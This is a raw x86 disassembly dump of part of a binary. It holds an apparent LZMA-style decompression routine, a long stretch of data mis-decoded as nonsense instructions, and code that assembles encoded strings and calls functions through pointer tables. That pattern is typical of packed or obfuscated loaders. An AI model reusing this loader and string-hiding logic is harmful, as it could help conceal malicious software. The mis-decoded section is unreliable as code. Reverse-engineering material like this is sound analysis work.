  42420f:	call   DWORD PTR [eax+0x28]
  424212:	jmp    0x42421e
  424214:	mov    eax,DWORD PTR [eax+0x17c]
  42421a:	mov    eax,DWORD PTR [eax]
  42421c:	add    DWORD PTR [esi],eax
  42421e:	pop    edi
  42421f:	pop    esi
  424220:	pop    ebx
  424221:	leave  
  424222:	ret    0x20
  424225:	push   edi
  424226:	push   esi
  424227:	push   ebx
  424228:	push   ebp
  424229:	mov    ebp,esp
  42422b:	mov    eax,DWORD PTR [ebp+0x24]
  42422e:	add    DWORD PTR [ebp+0x28],eax
  424231:	push   eax
  424232:	cld    
  424233:	mov    esi,DWORD PTR [ebp+0x18]
  424236:	add    DWORD PTR [ebp+0x1c],esi
  424239:	push   esi
  42423a:	mov    esi,DWORD PTR [ebp+0x14]
  42423d:	lods   eax,DWORD PTR ds:[esi]
  42423e:	xchg   edx,eax
  42423f:	push   edx
  424240:	mov    cl,BYTE PTR [esi-0x2]
  424243:	or     eax,0xffffffff
  424246:	shl    eax,cl
  424248:	not    eax
  42424a:	push   eax
  42424b:	mov    cl,dh
  42424d:	or     eax,0xffffffff
  424250:	shl    eax,cl
  424252:	not    eax
  424254:	push   eax
  424255:	add    cl,dl
  424257:	mov    edi,esi
  424259:	sub    esp,0xc
  42425c:	sub    eax,eax
  42425e:	inc    eax
  42425f:	push   eax
  424260:	push   eax
  424261:	push   eax
  424262:	push   eax
  424263:	push   eax
  424264:	push   edi
  424265:	sub    esi,esi
  424267:	push   esi
  424268:	or     ebx,0xffffffff
  42426b:	mov    eax,0x300
  424270:	shl    eax,cl
  424272:	lea    ecx,[eax+0x736]
  424278:	mov    eax,0x4000400
  42427d:	shr    ecx,1
  42427f:	rep stos DWORD PTR es:[edi],eax
  424281:	push   0x5
  424283:	pop    ecx
  424284:	call   0x42456f
  424289:	loop   0x424284
  42428b:	lea    esi,[esi]
  42428d:	lea    edi,[edi]
  42428f:	mov    edi,DWORD PTR [ebp-0x4]
  424292:	mov    eax,DWORD PTR [ebp-0x10]
  424295:	sub    edi,DWORD PTR [ebp+0x24]
  424298:	and    eax,edi
  42429a:	mov    DWORD PTR [ebp-0x18],eax
  42429d:	mov    al,0x0
  42429f:	call   0x424587
  4242a4:	jne    0x42433f
  4242aa:	mov    cl,BYTE PTR [ebp-0xc]
  4242ad:	and    edi,DWORD PTR [ebp-0x14]
  4242b0:	shl    edi,cl
  4242b2:	sub    cl,0x8
  4242b5:	neg    cl
  4242b7:	shr    esi,cl
  4242b9:	pop    eax
  4242ba:	add    edi,esi
  4242bc:	pop    esi
  4242bd:	lea    edi,[edi+edi*2]
  4242c0:	shl    edi,0x8
  4242c3:	cmp    al,0x7
  4242c5:	pop    edx
  4242c6:	lea    ecx,[esi+edi*2+0xe6c]
  4242cd:	push   ecx
  4242ce:	push   esi
  4242cf:	mov    esi,0x100
  4242d4:	push   eax
  4242d5:	mov    al,0x1
  4242d7:	jb     0x42430d
  4242d9:	mov    edi,DWORD PTR [ebp-0x4]
  4242dc:	sub    edi,DWORD PTR [ebp-0x24]
  4242df:	movzx  edi,BYTE PTR [edi]
  4242e2:	mov    ebp,DWORD PTR [ebp-0x34]
  4242e5:	shl    edi,1
  4242e7:	mov    ecx,esi
  4242e9:	and    esi,edi
  4242eb:	add    ecx,esi
  4242ed:	lea    ebp,[ebp+ecx*2+0x0]
  4242f1:	call   0x4245a6
  4242f6:	mov    ecx,eax
  4242f8:	shr    esi,0x8
  4242fb:	and    ecx,0x1
  4242fe:	cmp    esi,ecx
  424300:	mov    esi,0x100
  424305:	jne    0x424315
  424307:	cmp    eax,esi
  424309:	jb     0x4242e2
  42430b:	jmp    0x424321
  42430d:	mov    ebp,DWORD PTR [ebp-0x34]
  424310:	call   0x4245a6
  424315:	inc    eax
  424316:	inc    esi
  424317:	sub    eax,0x1
  42431a:	sub    esi,0x1
  42431d:	cmp    eax,esi
  42431f:	jb     0x42430d
  424321:	pop    edx
  424322:	inc    edx
  424323:	cmp    edx,0x5
  424326:	dec    edx
  424327:	mov    ecx,edx
  424329:	jb     0x42433a
  42432b:	inc    edx
  42432c:	cmp    edx,0xb
  42432f:	dec    edx
  424330:	mov    cl,0x4
  424332:	dec    cl
  424334:	jb     0x42433a
  424336:	mov    cl,0x7
  424338:	dec    cl
  42433a:	sub    edx,ecx
  42433c:	push   edx
  42433d:	jmp    0x42438e
  42433f:	mov    al,0xc1
  424341:	dec    al
  424343:	call   0x424597
  424348:	jne    0x42435e
  42434a:	pop    eax
  42434b:	pop    edi
  42434c:	pop    edx
  42434d:	pop    ecx
  42434e:	pop    edx
  42434f:	pop    ecx
  424350:	push   DWORD PTR [esp]
  424353:	push   ecx
  424354:	push   edx
  424355:	mov    edx,0x664
  42435a:	mov    cl,0x0
  42435c:	jmp    0x4243d1
  42435e:	mov    al,0xcd
  424360:	dec    al
  424362:	call   0x424597
  424367:	jne    0x424397
  424369:	mov    al,0xf1
  42436b:	dec    al
  42436d:	call   0x424587
  424372:	jne    0x4243c7
  424374:	pop    eax
  424375:	cmp    al,0x7
  424377:	mov    al,0x9
  424379:	jb     0x42437d
  42437b:	mov    al,0xb
  42437d:	push   eax
  42437e:	mov    esi,DWORD PTR [ebp-0x4]
  424381:	sub    esi,DWORD PTR [ebp-0x24]
  424384:	cmp    esi,DWORD PTR [ebp+0x24]
  424387:	jb     0x42455e
  42438d:	lods   al,BYTE PTR ds:[esi]
  42438e:	mov    edi,DWORD PTR [ebp-0x4]
  424391:	stos   BYTE PTR es:[edi],al
  424392:	jmp    0x424525
  424397:	mov    al,0xd8
  424399:	call   0x424597
  42439e:	mov    esi,DWORD PTR [ebp-0x28]
  4243a1:	je     0x4243be
  4243a3:	mov    al,0xe4
  4243a5:	call   0x424597
  4243aa:	mov    esi,DWORD PTR [ebp-0x2c]
  4243ad:	je     0x4243b8
  4243af:	mov    esi,DWORD PTR [ebp-0x30]
  4243b2:	mov    ecx,DWORD PTR [ebp-0x2c]
  4243b5:	mov    DWORD PTR [ebp-0x30],ecx
  4243b8:	mov    ecx,DWORD PTR [ebp-0x28]
  4243bb:	mov    DWORD PTR [ebp-0x2c],ecx
  4243be:	mov    ecx,DWORD PTR [ebp-0x24]
  4243c1:	mov    DWORD PTR [ebp-0x28],ecx
  4243c4:	mov    DWORD PTR [ebp-0x24],esi
  4243c7:	pop    eax
  4243c8:	pop    edi
  4243c9:	pop    ecx
  4243ca:	mov    edx,0xa68
  4243cf:	mov    cl,0x8
  4243d1:	add    edx,edi
  4243d3:	push   edx
  4243d4:	push   edi
  4243d5:	cmp    al,0x7
  4243d7:	mov    al,cl
  4243d9:	jb     0x4243dd
  4243db:	add    al,0x3
  4243dd:	push   eax
  4243de:	mov    ebp,DWORD PTR [ebp-0x34]
  4243e1:	call   0x4245a4
  4243e6:	jne    0x4243fc
  4243e8:	mov    eax,DWORD PTR [ebp-0x18]
  4243eb:	mov    edi,DWORD PTR [ebp-0x34]
  4243ee:	shl    eax,0x3
  4243f1:	sub    ecx,ecx
  4243f3:	push   0x8
  4243f5:	pop    esi
  4243f6:	lea    edi,[edi+eax*2+0x4]
  4243fa:	jmp    0x424431
  4243fc:	mov    ebp,DWORD PTR [ebp-0x34]
  4243ff:	add    ebp,0x2
  424402:	call   0x4245a4
  424407:	jne    0x424421
  424409:	mov    eax,DWORD PTR [ebp-0x18]
  42440c:	mov    edi,DWORD PTR [ebp-0x34]
  42440f:	shl    eax,0x3
  424412:	push   0x8
  424414:	pop    ecx
  424415:	push   0x8
  424417:	pop    esi
  424418:	lea    edi,[edi+eax*2+0x104]
  42441f:	jmp    0x424431
  424421:	mov    edi,0x204
  424426:	add    edi,DWORD PTR [ebp-0x34]
  424429:	push   0x10
  42442b:	pop    ecx
  42442c:	mov    esi,0x100
  424431:	mov    DWORD PTR [ebp-0x1c],ecx
  424434:	sub    eax,eax
  424436:	inc    eax
  424437:	mov    ebp,edi
  424439:	call   0x4245a6
  42443e:	mov    ecx,eax
  424440:	sub    ecx,esi
  424442:	jb     0x424437
  424444:	add    DWORD PTR [ebp-0x1c],ecx
  424447:	cmp    DWORD PTR [ebp-0x3c],0x4
  42444b:	jae    0x424501
  424451:	add    DWORD PTR [ebp-0x3c],0x7
  424455:	mov    ecx,DWORD PTR [ebp-0x1c]
  424458:	cmp    ecx,0x4
  42445b:	jb     0x424460
  42445d:	push   0x3
  42445f:	pop    ecx
  424460:	mov    edi,DWORD PTR [ebp-0x38]
  424463:	shl    ecx,0x6
  424466:	sub    eax,eax
  424468:	inc    eax
  424469:	push   0x40
  42446b:	pop    esi
  42446c:	lea    edi,[edi+ecx*2+0x360]
  424473:	mov    ebp,edi
  424475:	call   0x4245a6
  42447a:	mov    ecx,eax
  42447c:	sub    ecx,esi
  42447e:	jb     0x424473
  424480:	mov    DWORD PTR [ebp-0x18],ecx
  424483:	mov    DWORD PTR [ebp-0x24],ecx
  424486:	cmp    ecx,0x4
  424489:	jb     0x4244fe
  42448b:	mov    esi,ecx
  42448d:	and    DWORD PTR [ebp-0x24],0x1
  424491:	shr    esi,1
  424493:	or     DWORD PTR [ebp-0x24],0x2
  424497:	dec    esi
  424498:	cmp    ecx,0xe
  42449b:	jae    0x4244b6
  42449d:	mov    eax,0x2af
  4244a2:	sub    eax,ecx
  4244a4:	mov    ecx,esi
  4244a6:	shl    BYTE PTR [ebp-0x24],cl
  4244a9:	add    eax,DWORD PTR [ebp-0x24]
  4244ac:	shl    eax,1
  4244ae:	add    eax,DWORD PTR [ebp-0x38]
  4244b1:	mov    DWORD PTR [ebp-0x34],eax
  4244b4:	jmp    0x4244e3
  4244b6:	sub    esi,0x4
  4244b9:	call   0x424563
  4244be:	shr    ebx,1
  4244c0:	shl    DWORD PTR [ebp-0x24],1
  4244c3:	cmp    DWORD PTR [ebp-0x20],ebx
  4244c6:	jb     0x4244ce
  4244c8:	inc    DWORD PTR [ebp-0x24]
  4244cb:	sub    DWORD PTR [ebp-0x20],ebx
  4244ce:	dec    esi
  4244cf:	jne    0x4244b9
  4244d1:	mov    eax,0x644
  4244d6:	add    eax,DWORD PTR [ebp-0x38]
  4244d9:	mov    DWORD PTR [ebp-0x34],eax
  4244dc:	shl    DWORD PTR [ebp-0x24],0x4
  4244e0:	push   0x4
  4244e2:	pop    esi
  4244e3:	sub    edi,edi
  4244e5:	inc    edi
  4244e6:	mov    eax,edi
  4244e8:	mov    ebp,DWORD PTR [ebp-0x34]
  4244eb:	call   0x4245a6
  4244f0:	test   al,0x1
  4244f2:	je     0x4244f7
  4244f4:	or     DWORD PTR [ebp-0x24],edi
  4244f7:	shl    edi,1
  4244f9:	dec    esi
  4244fa:	jne    0x4244e8
  4244fc:	jmp    0x4244fe
  4244fe:	inc    DWORD PTR [ebp-0x24]
  424501:	mov    ecx,DWORD PTR [ebp-0x1c]
  424504:	add    ecx,0x2
  424507:	mov    edi,DWORD PTR [ebp-0x4]
  42450a:	mov    eax,edi
  42450c:	sub    eax,DWORD PTR [ebp+0x24]
  42450f:	cmp    DWORD PTR [ebp-0x24],eax
  424512:	ja     0x42455e
  424514:	mov    esi,edi
  424516:	sub    esi,DWORD PTR [ebp-0x24]
  424519:	mov    edx,DWORD PTR [ebp+0x28]
  42451c:	lods   al,BYTE PTR ds:[esi]
  42451d:	stos   BYTE PTR es:[edi],al
  42451e:	cmp    edi,edx
  424520:	jae    0x424525
  424522:	dec    ecx
  424523:	jne    0x42451c
  424525:	mov    DWORD PTR [ebp-0x4],edi
  424528:	movzx  esi,al
  42452b:	cmp    edi,DWORD PTR [ebp+0x28]
  42452e:	jb     0x42428f
  424534:	call   0x424563
  424539:	sub    eax,eax
  42453b:	lea    ebp,[esp+0x3c]
  42453f:	mov    edx,DWORD PTR [ebp+0x20]
  424542:	mov    esi,DWORD PTR [ebp-0x8]
  424545:	sub    esi,DWORD PTR [ebp+0x18]
  424548:	mov    DWORD PTR [edx],esi
  42454a:	mov    edx,DWORD PTR [ebp+0x2c]
  42454d:	mov    edi,DWORD PTR [ebp-0x4]
  424550:	sub    edi,DWORD PTR [ebp+0x24]
  424553:	mov    DWORD PTR [edx],edi
  424555:	leave  
  424556:	pop    ebx
  424557:	pop    esi
  424558:	pop    edi
  424559:	ret    0x1c
  42455c:	pop    esi
  42455d:	pop    eax
  42455e:	sub    eax,eax
  424560:	inc    eax
  424561:	jmp    0x42453b
  424563:	cmp    ebx,0x1000000
  424569:	jb     0x42456c
  42456b:	ret    
  42456c:	shl    ebx,0x8
  42456f:	push   esi
  424570:	mov    esi,DWORD PTR [ebp-0x8]
  424573:	cmp    esi,DWORD PTR [ebp+0x1c]
  424576:	jae    0x42455c
  424578:	mov    eax,DWORD PTR [ebp-0x20]
  42457b:	shl    eax,0x8
  42457e:	lods   al,BYTE PTR ds:[esi]
  42457f:	mov    DWORD PTR [ebp-0x20],eax
  424582:	mov    DWORD PTR [ebp-0x8],esi
  424585:	sbb    BYTE PTR [edi+0x6bbe29f7],bh
  42458b:	sar    BYTE PTR [edx+0x7f7e9dbd],0x31
  424592:	xchg   edx,eax
  424593:	jg     0x424552
  424595:	xchg   edi,eax
  424596:	jo     0x424603
  424598:	sar    BYTE PTR [edx-0x841ce81],0x9
  42459f:	mov    dl,0xe9
  4245a1:	push   ss
  4245a2:	xor    DWORD PTR [edx+0x57],edi
  4245a5:	mov    edx,0x7a3116e9
  4245aa:	std    
  4245ab:	xchg   DWORD PTR [edx+0x7a],edi
  4245ae:	jp     0x42462d
  4245b0:	pcmpgtd mm6,mm7
  4245b3:	ss pop esi
  4245b5:	inc    edx
  4245b6:	mov    ebp,0x725a5e1e
  4245bb:	inc    edi
  4245bc:	ss pop esi
  4245be:	es (bad) 
  4245c1:	hlt    
  4245c2:	ins    DWORD PTR es:[edi],dx
  4245c3:	jnp    0x424603
  4245c5:	pop    esi
  4245c6:	inc    edx
  4245c7:	mov    ebp,0x2ef2729f
  4245cc:	pop    esi
  4245cd:	pop    edx
  4245ce:	div    DWORD PTR [edi+0x7a21c36b]
  4245d4:	mov    ebp,0xcb6b7795
  4245d9:	mov    ah,0x45
  4245db:	ss pop esi
  4245dd:	pop    edx
  4245de:	packsswb mm6,mm7
  4245e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245e2:	lds    edi,FWORD PTR [edx+0x72]
  4245e5:	jp     0x424661
  4245e7:	push   edi
  4245e8:	mov    ah,0xbd
  4245ea:	xchg   ebp,eax
  4245eb:	jno    0x4245fd
  4245ed:	jge    0x424618
  4245ef:	jp     0x424670
  4245f1:	mov    edx,0x3a5e16e9
  4245f6:	mov    edi,0x557194bd
  4245fb:	ss pop esi
  4245fd:	pop    edx
  4245fe:	push   edi
  4245ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424600:	adc    BYTE PTR [ebp+0x21],dl
  424603:	jp     0x424684
  424605:	mov    edx,0xe97dbaff
  42460a:	push   ss
  42460b:	pop    esi
  42460c:	cmp    bh,BYTE PTR [edi-0x26908df]
  424612:	xchg   esi,eax
  424613:	push   esi
  424614:	jge    0x424690
  424616:	jp     0x424647
  424618:	and    BYTE PTR [ebx],ah
  42461a:	mov    bl,0x31
  42461c:	mov    cl,dl
  42461e:	icebp  
  42461f:	out    0x82,al
  424621:	mov    bl,0x31
  424623:	xchg   edx,eax
  424624:	int    0xf1
  424626:	out    0x82,al
  424628:	div    DWORD PTR [ecx]
  42462a:	jb     0x424621
  42462c:	xor    DWORD PTR [edx-0x9],esi
  42462f:	sub    DWORD PTR [edx+0x2d72dec7],ecx
  424635:	jae    0x424686
  424637:	mov    bh,0xc2
  424639:	xchg   esi,eax
  42463a:	or     al,0x4c
  42463c:	jp     0x4246bd
  42463e:	mov    dl,0xf5
  424640:	sub    DWORD PTR [esi+0x4f8a29f7],ebp
  424646:	mov    bh,0x7f
  424648:	mov    dl,0xf5
  42464a:	sub    DWORD PTR [esi+0x4f8a29f7],edi
  424650:	mov    bh,0x7f
  424652:	mov    dl,0xf5
  424654:	sub    DWORD PTR [edx+0x4f8a29f7],edi
  42465a:	mov    bh,0x7f
  42465c:	mov    dl,0xf5
  42465e:	jmp    0x7bbdc1b5
  424663:	mov    bl,0x31
  424665:	retf   0x71ca
  424668:	fild   DWORD PTR [edx-0x3545ce4d]
  42466e:	shl    esi,0x82
  424671:	mov    bl,0x31
  424673:	(bad)  
  424674:	(bad)  
  424675:	icebp  
  424676:	out    0x82,al
  424678:	adc    al,0x51
  42467a:	and    eax,0xf5b229f5
  42467f:	sub    DWORD PTR [edx-0xadaeeec],esi
  424685:	sub    DWORD PTR [edx-0x4c4dd60b],esi
  42468b:	xor    DWORD PTR [edx+0x7a7a7a29],esi
  424691:	mov    bl,0x31
  424693:	mov    dl,0x3f
  424695:	jp     0x424711
  424697:	jp     0x424690
  424699:	sub    DWORD PTR [edx-0x4d8048b1],ecx
  42469f:	cmc    
  4246a0:	sub    DWORD PTR [edx+0x4f8a29f7],esi
  4246a6:	mov    bh,0x7f
  4246a8:	mov    dl,0xf5
  4246aa:	sub    DWORD PTR [edx+0x22a231b3],esi
  4246b0:	jl     0x42472c
  4246b2:	jp     0x424667
  4246b4:	xor    DWORD PTR [edx+0x7a7a7a40],ebx
  4246ba:	mov    bl,0x31
  4246bc:	xchg   esi,eax
  4246bd:	add    al,0x7a
  4246bf:	jp     0x42473b
  4246c1:	jmp    0x7bbad57f
  4246c6:	jnp    0x4246b1
  4246c8:	shr    DWORD PTR [esi-0x6d848488],0xb9
  4246cf:	jbe    0x42474b
  4246d1:	jp     0x42474e
  4246d3:	sub    DWORD PTR [esi+0x297b9401],edx
  4246d9:	call   0x1a2:0x297b9801
  4246e0:	lods   al,BYTE PTR ds:[esi]
  4246e1:	mov    bl,0x31
  4246e3:	mov    ds:0x7a7a3a68,al
  4246e8:	div    DWORD PTR [ecx]
  4246ea:	mov    cl,BYTE PTR [edi-0x41]
  4246ed:	mov    eax,0x7a4c0c96
  4246f2:	jg     0x4246a4
  4246f4:	cmc    
  4246f5:	xor    DWORD PTR [esi-0x75ce09],ebx
  4246fb:	rcl    DWORD PTR [esi],1
  4246fd:	jnp    0x42477a
  4246ff:	jnp    0x42477b
  424701:	dec    edi
  424702:	mov    edi,0x31f5b07f
  424707:	mov    dh,0x1e
  424709:	frstor [edx+0x7a]
  42470c:	jp     0x424788
  42470e:	cmc    
  42470f:	icebp  
  424710:	push   ss
  424711:	jnp    0x42478e
  424713:	jnp    0x42470c
  424715:	cmp    cl,BYTE PTR [edx-0xb]
  424718:	icebp  
  424719:	dec    esi
  42471a:	jnp    0x424797
  42471c:	jnp    0x424715
  42471e:	cmp    dh,BYTE PTR [esi-0xb]
  424721:	icebp  
  424722:	cmp    bh,BYTE PTR [ebx+0x7b]
  424725:	jnp    0x42471e
  424727:	xor    DWORD PTR [edx-0x17],esi
  42472a:	jmp    0x7bbdc245
  42472f:	cmc    
  424730:	repnz fidivr DWORD PTR [ebp+0x7a]
  424734:	jp     0x42472d
  424736:	xor    DWORD PTR [edx-0x17],esi
  424739:	jmp    0x7bbdc28c
  42473e:	cmc    
  42473f:	repnz fidivr WORD PTR [ebp+0x7a]
  424743:	jp     0x42473c
  424745:	xor    DWORD PTR [edx+0x7b],esi
  424748:	add    DWORD PTR [edx-0x17],esi
  42474b:	jmp    0x7bbdc28a
  424750:	cmc    
  424751:	repnz sar BYTE PTR [ebp+0x7a],cl
  424755:	jp     0x4246e9
  424757:	test   DWORD PTR [edi+0x7a],ebx
  42475a:	jp     0x424753
  42475c:	sub    DWORD PTR [edx-0x578048b1],ecx
  424762:	inc    edi
  424763:	mov    dl,0x6b
  424765:	(bad)  
  424766:	stc    
  424767:	jg     0x4247e3
  424769:	jp     0x424762
  42476b:	xor    DWORD PTR [edx-0x9],esi
  42476e:	cli    
  42476f:	out    dx,al
  424770:	jge    0x4247ec
  424772:	jp     0x42476b
  424774:	jb     0x42476d
  424776:	xor    DWORD PTR [edx-0x9],esi
  424779:	cli    
  42477a:	out    dx,al
  42477b:	jge    0x4247f7
  42477d:	jp     0x424776
  42477f:	jp     0x424800
  424781:	cmp    eax,0x829f746
  424786:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42478c:	lea    edx,[ebp-0xec]
  424792:	push   edx
  424793:	mov    edx,DWORD PTR [ebp+0x8]
  424796:	mov    edx,DWORD PTR [edx+0x18c]
  42479c:	mov    edx,DWORD PTR [edx]
  42479e:	add    edx,DWORD PTR [eax+0x88]
  4247a4:	push   0x4
  4247a6:	push   DWORD PTR [eax+0x8c]
  4247ac:	push   edx
  4247ad:	call   DWORD PTR [ecx+0x1c]
  4247b0:	push   DWORD PTR [ebp+0x8]
  4247b3:	xor    eax,eax
  4247b5:	mov    DWORD PTR [ebp-0xa8],0x123f0f35
  4247bf:	mov    DWORD PTR [ebp-0xa4],0xb360c1d
  4247c9:	mov    DWORD PTR [ebp-0xa0],0x3d0c1103
  4247d3:	mov    BYTE PTR [ebp-0x9c],0x7a
  4247da:	lea    edi,[ebp-0x9b]
  4247e0:	stos   DWORD PTR es:[edi],eax
  4247e1:	stos   WORD PTR es:[edi],ax
  4247e3:	stos   BYTE PTR es:[edi],al
  4247e4:	xor    eax,eax
  4247e6:	mov    DWORD PTR [ebp-0xbc],0x123f0f35
  4247f0:	mov    DWORD PTR [ebp-0xb8],0xb360c1d
  4247fa:	mov    DWORD PTR [ebp-0xb4],0x230c1103
  424804:	mov    BYTE PTR [ebp-0xb0],0x7a
  42480b:	lea    edi,[ebp-0xaf]
  424811:	stos   DWORD PTR es:[edi],eax
  424812:	stos   WORD PTR es:[edi],ax
  424814:	stos   BYTE PTR es:[edi],al
  424815:	mov    edi,DWORD PTR [ebp+0x8]
  424818:	mov    eax,DWORD PTR [ebp+0x8]
  42481b:	mov    edx,DWORD PTR [eax+0x1b8]
  424821:	mov    DWORD PTR [ebp-0x68],0xc0e0f16
  424828:	mov    DWORD PTR [ebp-0x64],0x150a091f
  42482f:	mov    WORD PTR [ebp-0x60],0x7a3d
  424835:	mov    DWORD PTR [ebp-0x90],0x123f0f35
  42483f:	mov    DWORD PTR [ebp-0x8c],0x163d0c1d
  424849:	mov    DWORD PTR [ebp-0x88],0x281d120a
  424853:	mov    DWORD PTR [ebp-0x84],0xc110901
  42485d:	mov    DWORD PTR [ebp-0x80],0x7a3d1f15
  424864:	mov    DWORD PTR [ebp-0x7c],0x123f0f35
  42486b:	mov    DWORD PTR [ebp-0x78],0x163d0c1d
  424872:	mov    DWORD PTR [ebp-0x74],0x281d120a
  424879:	mov    DWORD PTR [ebp-0x70],0xc110901
  424880:	mov    DWORD PTR [ebp-0x6c],0x7a231f15
  424887:	call   0x426b83
  42488c:	push   eax
  42488d:	mov    eax,DWORD PTR [ebp+0x8]
  424890:	mov    eax,DWORD PTR [eax+0x1a8]
  424896:	push   DWORD PTR [eax]
  424898:	call   0x426824
  42489d:	test   eax,eax
  42489f:	jne    0x4248f1
  4248a1:	mov    eax,DWORD PTR [ebp+0x8]
  4248a4:	mov    eax,DWORD PTR [eax+0x1d8]
  4248aa:	mov    edi,DWORD PTR [ebp+0x8]
  4248ad:	add    eax,0x4
  4248b0:	mov    DWORD PTR [ebp-0x24],eax
  4248b3:	mov    eax,DWORD PTR [ebp+0x8]
  4248b6:	mov    edx,DWORD PTR [eax+0x1b8]
  4248bc:	call   0x426b83
  4248c1:	push   eax
  4248c2:	mov    eax,DWORD PTR [ebp-0x24]
  4248c5:	call   DWORD PTR [eax]
  4248c7:	test   eax,eax
  4248c9:	jne    0x4248f1
  4248cb:	mov    eax,DWORD PTR [ebp+0x8]
  4248ce:	mov    eax,DWORD PTR [eax+0x1d8]
  4248d4:	mov    edi,DWORD PTR [ebp+0x8]
  4248d7:	add    eax,0x10
  4248da:	mov    DWORD PTR [ebp-0x24],eax
  4248dd:	mov    eax,DWORD PTR [ebp+0x8]
  4248e0:	mov    edx,DWORD PTR [eax+0x1b8]
  4248e6:	call   0x426b83
  4248eb:	push   eax
  4248ec:	mov    eax,DWORD PTR [ebp-0x24]
  4248ef:	call   DWORD PTR [eax]
  4248f1:	mov    eax,DWORD PTR [ebp-0x10]
  4248f4:	mov    ecx,DWORD PTR [ebp-0x28]
  4248f7:	xor    eax,ebx
  4248f9:	add    eax,esi
  4248fb:	cmp    eax,ecx
  4248fd:	je     0x424ac0
  424903:	mov    eax,DWORD PTR [ebp-0x18]
  424906:	xor    eax,ebx
  424908:	mov    ecx,0xffcd8d14
  42490d:	sub    ecx,eax
  42490f:	add    ecx,DWORD PTR [ebp-0x28]
  424912:	mov    eax,DWORD PTR [ebp-0x1c]
  424915:	cmp    eax,ecx
  424917:	ja     0x424ac0
  42491d:	mov    DWORD PTR [ebp-0x20],0x0
  424924:	push   DWORD PTR [ebp+0x8]
  424927:	mov    edi,DWORD PTR [ebp+0x8]
  42492a:	mov    eax,DWORD PTR [ebp+0x8]
  42492d:	mov    edx,DWORD PTR [eax+0x1b4]
  424933:	call   0x426b83
  424938:	push   eax
  424939:	mov    eax,DWORD PTR [ebp+0x8]
  42493c:	mov    eax,DWORD PTR [eax+0x1a8]
  424942:	push   DWORD PTR [eax]
  424944:	call   0x426824
  424949:	mov    ecx,DWORD PTR [ebp+0x8]
  42494c:	mov    ecx,DWORD PTR [ecx+0x19c]
  424952:	mov    DWORD PTR [ecx],eax
  424954:	mov    eax,DWORD PTR [ebp+0x8]
  424957:	mov    edi,DWORD PTR [eax+0x1d8]
  42495d:	mov    esi,DWORD PTR [ebp+0x8]
  424960:	xor    eax,eax
  424962:	lea    edx,[ebp-0x7c]
  424965:	call   0x426bb9
  42496a:	push   eax
  42496b:	mov    eax,DWORD PTR [ebp+0x8]
  42496e:	mov    eax,DWORD PTR [eax+0x19c]
  424974:	push   DWORD PTR [eax]
  424976:	call   DWORD PTR [edi+0x8]
  424979:	mov    DWORD PTR [ebp-0x24],eax
  42497c:	mov    eax,DWORD PTR [ebp+0x8]
  42497f:	mov    edi,DWORD PTR [eax+0x1d8]
  424985:	mov    esi,DWORD PTR [ebp+0x8]
  424988:	xor    eax,eax
  42498a:	lea    edx,[ebp-0x90]
  424990:	call   0x426bb9
  424995:	push   eax
  424996:	mov    eax,DWORD PTR [ebp+0x8]
  424999:	mov    eax,DWORD PTR [eax+0x19c]
  42499f:	push   DWORD PTR [eax]
  4249a1:	call   DWORD PTR [edi+0x8]
  4249a4:	mov    eax,DWORD PTR [ebp+0x8]
  4249a7:	mov    edi,DWORD PTR [eax+0x1d8]
  4249ad:	mov    esi,DWORD PTR [ebp+0x8]
  4249b0:	xor    eax,eax
  4249b2:	lea    edx,[ebp-0xa8]
  4249b8:	call   0x426bb9
  4249bd:	push   eax
  4249be:	mov    eax,DWORD PTR [ebp+0x8]
  4249c1:	mov    eax,DWORD PTR [eax+0x19c]
  4249c7:	push   DWORD PTR [eax]
  4249c9:	call   DWORD PTR [edi+0x8]
  4249cc:	and    DWORD PTR [ebp-0x8],0x0
  4249d0:	mov    DWORD PTR [ebp-0x44],eax
  4249d3:	mov    eax,DWORD PTR [ebp-0x8]
  4249d6:	and    eax,0x7
  4249d9:	add    eax,0x31
  4249dc:	push   eax
  4249dd:	call   DWORD PTR [ebp-0x24]
  4249e0:	test   eax,eax
  4249e2:	je     0x424a26
  4249e4:	mov    eax,DWORD PTR [ebp-0x8]
  4249e7:	push   0x19
  4249e9:	xor    edx,edx
  4249eb:	pop    ecx
  4249ec:	div    ecx
  4249ee:	add    dl,0x41
  4249f1:	movzx  eax,dl
  4249f4:	push   eax
  4249f5:	call   DWORD PTR [ebp-0x44]
  4249f8:	test   eax,eax
  4249fa:	jne    0x424a26
  4249fc:	mov    eax,DWORD PTR [ebp+0x8]
  4249ff:	mov    edi,DWORD PTR [eax+0x1d8]
  424a05:	mov    esi,DWORD PTR [ebp+0x8]
  424a08:	xor    eax,eax
  424a0a:	lea    edx,[ebp-0x68]
  424a0d:	call   0x426bb9
  424a12:	push   eax
  424a13:	mov    eax,DWORD PTR [ebp+0x8]
  424a16:	mov    eax,DWORD PTR [eax+0x198]
  424a1c:	push   DWORD PTR [eax]
  424a1e:	call   DWORD PTR [edi+0x8]
  424a21:	mov    DWORD PTR [ebp-0x14],eax
  424a24:	jmp    0x424a2a
  424a26:	and    DWORD PTR [ebp-0x14],0x0
  424a2a:	inc    DWORD PTR [ebp-0x8]
  424a2d:	cmp    DWORD PTR [ebp-0x8],0x10
  424a31:	jb     0x4249d3
  424a33:	mov    eax,DWORD PTR [ebp-0x18]
  424a36:	mov    esi,DWORD PTR [ebp+0x8]
  424a39:	xor    eax,ebx
  424a3b:	mov    edi,0x3272ec
  424a40:	add    eax,edi
  424a42:	lea    edx,[ebp-0x10c]
  424a48:	call   0x426bb9
  424a4d:	push   eax
  424a4e:	mov    eax,DWORD PTR [ebp-0x10]
  424a51:	mov    esi,DWORD PTR [ebp+0x8]
  424a54:	xor    eax,ebx
  424a56:	add    eax,edi
  424a58:	lea    edx,[ebp-0x12c]
  424a5e:	call   0x426bb9
  424a63:	push   eax
  424a64:	call   DWORD PTR [ebp-0x14]
  424a67:	mov    ecx,DWORD PTR [ebp-0x10]
  424a6a:	xor    ecx,ebx
  424a6c:	add    ecx,edi
  424a6e:	cmp    ecx,eax
  424a70:	jne    0x424a79
  424a72:	mov    DWORD PTR [ebp-0x20],0x1
  424a79:	mov    eax,DWORD PTR [ebp-0x18]
  424a7c:	mov    ecx,DWORD PTR [ebp-0x1c]
  424a7f:	xor    eax,ebx
  424a81:	lea    eax,[eax+ecx*1+0x3272ec]
  424a88:	mov    DWORD PTR [ebp-0x1c],eax
  424a8b:	mov    eax,DWORD PTR [ebp-0x20]
  424a8e:	test   eax,eax
  424a90:	je     0x424aa4
